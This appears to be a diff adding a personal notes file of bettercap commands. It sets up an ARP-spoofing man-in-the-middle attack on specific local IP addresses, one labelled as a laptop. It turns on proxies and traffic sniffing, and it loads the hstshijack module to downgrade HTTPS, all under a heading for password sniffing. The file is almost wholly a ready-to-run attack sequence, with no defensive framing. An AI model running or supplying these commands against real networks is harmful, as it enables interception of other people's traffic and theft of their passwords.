@@ -1,0 +1,26 @@
+any.proxy on
+http.proxy on
+https.proxy on
+https.server on
+net.probe on
+net.recon on
+net.sniff on
+packet.proxy on 
+tcp.proxy on
+
+net.show
+set arp.spoof.fullduplex true
+
+
+#Password Sniffing:
+
+net.probe on
+net.recon on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.18.2 (More than sep. by commas)
+#Laptop
+set arp.spoof.targets 192.168.18.9,192.168.18.2 
+set net.sniff.local true
+arp.spoof on
+net.sniff on
+hstshijack/hstshijack
